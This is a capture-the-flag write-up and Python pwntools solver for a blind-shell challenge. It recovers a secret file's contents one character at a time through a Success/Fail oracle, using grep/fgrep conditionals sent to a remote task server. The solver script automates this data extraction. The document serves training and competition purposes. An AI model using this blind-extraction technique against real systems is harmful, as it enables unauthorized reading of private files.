"""
We connect to a shell which awaits input.

After entering a few commands, we find that we can run any valid shell commands and the server will tell us if the command
can be executed by printing Success! or "Fail".

For example:
If we enter "ls", the server will respond with "Success"
If we enter "print", the server will respond with "Fail"

Based on this, we can figure out if there is a file called flag.txt
find flag.txt - returns "Success!"
find fla.txt - returns "Fail!"
This reveals to us that there is a file called flag.txt!

Great, unfortunately, "cat flag.txt" does not print the flag but returns "Success!".

However, using grep, we can find out if our flag.txt file contains a substring, using the following command:
If flag.txt contains SUBSTRING, then we will simply echo "T", which is valid. If it does not, we will run the command "Fail",
which is not a valid command. Hence we will fail
if grep -q "SUBSTRING" "flag.txt"; then echo "T"; else "Fail"; fi


Now we can simply create a script which will find our flag:

flag=[]
chr="a"
if flag.txt contains flag+chr:
  flag += chr
  chr = "a"
else
  Move chr to next char

We will encounter a few problems here: The flag might contain numbers (it does not) or "_" (it does) and lower/upper case characters
We can check them manually.
After testing some special characters, we find that the following (special) characters are present: '.$_\?^,'+string.ascii_lowercase
Another problem which we will run into is that the substring might not be the start of the string.

After finding the string ........$Look_around,maybe_here?$_$_$_$_$_ we will get prompted with a new message:
Be careful! Those are regular expressions

You can solve this task with less symbols :)

This means we now have to adapt our strategy and explore left and right of our current string while not using more than 43 symbols

Validate lines:
if [[ `wc -l flag.txt | awk '{print $1}'` -eq 1 ]]; then echo "True"; else echo "false"; fi
#Validate number of characters
if [[ `wc -m temp.txt | awk '{print $1}'` -eq 3 ]]; then echo "True"; else echo "false"; fi
Validate string
if fgrep "Look_around,maybe_here?" "temp.txt"; then echo "True"; else echo "Fail";  fi
Find files
if ls | fgrep -c 'ba'; then echo "T"; else ech "F"; fi

Our directory has 3 files:
flag.txt with the content: "Look_around,maybe_here?"
maybehere
server.py

In the maybehere, we can find one file which is also called flag.txt.
The content of this file is
Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_amaz19g

"""

import pwn
import string

f = open("flag.txt","r")
flag = f.read()

pwn.context.log_level = 'error'
sh = pwn.remote('tasks.kksctf.ru', 30010)
r = sh.recvuntil("$ ")

alphabet = '_0123456789'+string.ascii_letters
flag = 'Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_amaz19g'
folders = ''
while True:
    #Find the first matching character of the flag and then build the rest of the flag (to the right)

    for i in range(len(alphabet)):
        start = max(0,20-len(flag))
        msg = 'if fgrep -c "{}" "maybehere/flag.txt"; then echo "T"; else "Fail"; fi'.format((flag+alphabet[i])[start:])
        #msg = "if ls maybehere | fgrep -c '{}'; then echo 'T'; else ech; fi".format(folders+alphabet[i])
        sh.sendline(msg)
        response = sh.recvuntil('$ ')
        if "Success!" in response.decode():
            flag += alphabet[i]
            #folders += alphabet[i]
            #print(alphabet[i])
            break

    #If we hav no match, we found the end of the flag. Now we need the start
    for i in range(len(alphabet)):
        end = 35
        msg = 'if fgrep -c "{}" "maybehere/flag.txt"; then echo "T"; else "Fail"; fi'.format((alphabet[i]+flag)[:20])
        #msg = "if ls maybehere | fgrep -c '{}'; then echo 'T'; else ech; fi".format(alphabet[i] + folders)
        sh.sendline(msg)
        response1 = sh.recvuntil('$ ')
        if "Success!" in response1.decode():
            flag = alphabet[i] + flag
            #folders = alphabet[i] + folders
            break
    print(flag)
